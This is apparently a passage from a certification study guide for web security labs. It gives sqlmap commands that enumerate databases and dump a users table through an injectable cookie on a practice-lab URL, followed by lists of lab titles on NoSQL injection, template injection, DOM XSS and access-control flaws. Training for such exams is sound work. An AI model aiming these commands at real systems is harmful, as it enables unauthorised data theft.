### * SQL Injection

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-sql-injection-2)

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filter?category=Accessories' --random-agent --time-sec 10 --cookie='TrackingId=GUBpz9hcYzRjNlGe*;session=6RxgvjoS8qWLUdHS8OogcVuMtyGZSDxP' --dbs
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filter?category=Accessories' --random-agent --time-sec 10 --cookie='TrackingId=GUBpz9hcYzRjNlGe*;session=6RxgvjoS8qWLUdHS8OogcVuMtyGZSDxP' -D public --tables
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filter?category=Accessories' --random-agent --time-sec 10 --cookie='TrackingId=GUBpz9hcYzRjNlGe*;session=6RxgvjoS8qWLUdHS8OogcVuMtyGZSDxP' -D public -T users --dump
```

- Blind SQL injection with out-of-band interaction
    
- Blind SQL injection with out-of-band data exfiltration
    

### * NoSQL Injection

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-nosql-injection-1)

- Detecting NoSQL injection

### * SSTI

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-ssti-3)

- Basic server-side template injection
    
- Server-side template injection in an unknown language with a documented exploit
    

### * DOM XSS

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-dom-xss-1)

- DOM XSS in jQuery anchor href attribute sink using location.search source

### * Flawed Access Control

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-flawed-access-control-2)

- User ID controlled by request parameter
    
- User ID controlled by request parameter, with unpredictable user IDs
    
- User ID controlled by request parameter with data leakage in redirect
    
- User ID controlled by request parameter with password disclosure